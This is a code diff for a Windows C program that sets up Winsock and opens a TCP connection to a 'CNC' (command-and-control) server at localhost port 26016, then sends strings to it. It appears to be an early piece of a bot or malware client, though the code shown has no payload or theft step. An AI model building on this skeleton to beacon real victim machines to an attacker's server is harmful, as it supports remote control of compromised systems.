@@ -1,16 +1,75 @@
+#define _WIN32_WINNT 0x501
+
+#include <stdio.h>
 #include <stdlib.h>
 #include <winsock2.h>
 #include <ws2tcpip.h>
-#include <stdio.h>
 
-void init_winsock()
-{
-    int status_code;
-    WSADATA wsaData;
-    status_code = WSAStartup(MAKEWORD(2, 2), &wsaData);
-    if (status_code != 0)
-    {
-        printf("WSAStartup failed: %d\n", status_code);
-        exit(1);
-    }
+const char *cnc_host = "127.0.0.1";
+const char *cnc_port = "26016";
+
+SOCKET *cnc = NULL;
+
+void initwinsock() {
+  int res;
+  WSADATA wsaData;
+  res = WSAStartup(MAKEWORD(2, 2), &wsaData);
+  if (res != 0) {
+    printf("WSAStartup failed: %d\n", res);
+    exit(1);
+  }
+}
+
+struct addrinfo getcncinfo() {
+  int res;
+  struct addrinfo *result = NULL;
+  struct addrinfo hints = {.ai_family = AF_UNSPEC,
+                           .ai_socktype = SOCK_STREAM,
+                           .ai_protocol = IPPROTO_TCP};
+  res = getaddrinfo(cnc_host, cnc_port, &hints, &result);
+  if (res != 0) {
+    printf("getaddrinfo failed: %d\n", res);
+    WSACleanup();
+    exit(1);
+  }
+  return *result;
+}
+
+void initcncsock() {
+  struct addrinfo cncinfo = getcncinfo();
+  SOCKET *conn = malloc(sizeof(SOCKET));
+  *conn = socket(cncinfo.ai_family, cncinfo.ai_socktype, cncinfo.ai_protocol);
+  if (*conn == INVALID_SOCKET) {
+    printf("Error at socket(): %ld\n", WSAGetLastError());
+    freeaddrinfo(&cncinfo);
+    WSACleanup();
+    exit(1);
+  } else {
+    cnc = conn;
+  }
+}
+
+void connectcnc() {
+  struct addrinfo cncinfo = getcncinfo();
+  int res = connect(*cnc, cncinfo.ai_addr, cncinfo.ai_addrlen);
+  if (res == SOCKET_ERROR) {
+    printf("Unable to connect to CNC.\n");
+    printf("Error at connect(): %ld\n", WSAGetLastError());
+    WSACleanup();
+    exit(1);
+  }
+}
+
+void startclient() {
+  initwinsock();
+  initcncsock();
+  connectcnc();
+}
+
+void sendtocnc(char *buf) {
+  int res = send(*cnc, buf, strlen(buf), 0);
+  if (res == SOCKET_ERROR) {
+    printf("send failed: %d\n", WSAGetLastError());
+    exit(1);
+  }
 }
